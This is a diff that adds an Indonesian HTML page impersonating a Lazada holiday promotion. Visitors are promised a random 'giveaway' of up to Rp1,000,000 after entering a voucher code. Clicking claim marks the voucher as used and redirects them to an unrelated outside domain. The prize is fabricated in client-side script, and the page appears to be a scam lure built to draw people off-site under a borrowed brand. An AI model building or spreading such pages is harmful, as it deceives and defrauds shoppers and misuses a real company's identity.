@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Promo Liburan</title>
+
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#ff9f43,#ff6b6b);
+    font-family:Arial,sans-serif;
+}
+
+.card{
+    width:380px;
+    background:#fff;
+    padding:30px;
+    border-radius:20px;
+    text-align:center;
+    box-shadow:0 15px 30px rgba(0,0,0,.2);
+}
+
+.logo{
+    width:80px;
+    margin-bottom:10px;
+}
+
+.desc{
+    font-size:13px;
+    color:#666;
+    margin-bottom:15px;
+    line-height:1.4;
+}
+
+input{
+    width:100%;
+    padding:14px;
+    margin:10px 0;
+    border-radius:10px;
+    border:1px solid #ddd;
+    text-align:center;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:#ff6a00;
+    color:#fff;
+    font-size:16px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+button:hover{
+    background:#e85d00;
+}
+
+.result{
+    display:none;
+    margin-top:20px;
+    padding:15px;
+    border-radius:10px;
+    background:#eaffea;
+    color:#0a7a2a;
+    font-weight:bold;
+}
+
+.error{
+    display:none;
+    margin-top:15px;
+    padding:12px;
+    background:#ffe5e5;
+    color:#c0392b;
+    border-radius:10px;
+    font-size:13px;
+}
+
+.claim-btn{
+    display:none;
+    margin-top:10px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/c/c0/Lazada-logo-rounded-lazada-logo-free-png.webp">
+
+    <h2>Promo Liburan</h2>
+
+    <p class="desc">
+        Masukkan kode voucher spesial untuk mendapatkan saldo giveaway hingga Rp1.000.000
+    </p>
+
+    <input type="text" id="promoCode" placeholder="Masukkan kode promo">
+
+    <button onclick="checkPromo()">Cek Promo</button>
+
+    <div class="error" id="error"></div>
+
+    <div class="result" id="result"></div>
+
+    <div class="claim-btn" id="claimBtn">
+        <button onclick="claimNow()">CLAIM SEKARANG</button>
+    </div>
+
+</div>
+
+<script>
+
+const VALID_CODE = "LIBUR2026";
+
+const nominal = [
+    50000,100000,150000,200000,250000,
+    300000,350000,400000,450000,500000,1000000
+];
+
+function checkPromo(){
+
+    const input = document.getElementById("promoCode").value.trim();
+    const result = document.getElementById("result");
+    const error = document.getElementById("error");
+    const claimBtn = document.getElementById("claimBtn");
+
+    let claimed = localStorage.getItem("claimedVoucher");
+
+    if(claimed){
+        error.style.display = "block";
+        error.innerHTML = "Voucher sudah pernah diklaim.";
+        result.style.display = "none";
+        claimBtn.style.display = "none";
+        return;
+    }
+
+    if(input === VALID_CODE){
+
+        const hadiah = nominal[Math.floor(Math.random()*nominal.length)];
+
+        result.style.display = "block";
+        error.style.display = "none";
+        claimBtn.style.display = "block";
+
+        result.innerHTML = "🎉 Kamu mendapatkan Rp " + hadiah.toLocaleString("id-ID");
+
+        // simpan sementara nilai hadiah
+        localStorage.setItem("lastReward", hadiah);
+
+    } else {
+        error.style.display = "block";
+        error.innerHTML = "Kode voucher salah!";
+        result.style.display = "none";
+        claimBtn.style.display = "none";
+    }
+}
+
+function claimNow(){
+
+    // tandai sudah klaim
+    localStorage.setItem("claimedVoucher", "true");
+
+    alert("Voucher berhasil diklaim!");
+
+    // redirect yang BENAR
+    window.location.href = "https://pagcoroke.com";
+}
+
+</script>
+
+</body>
+</html>
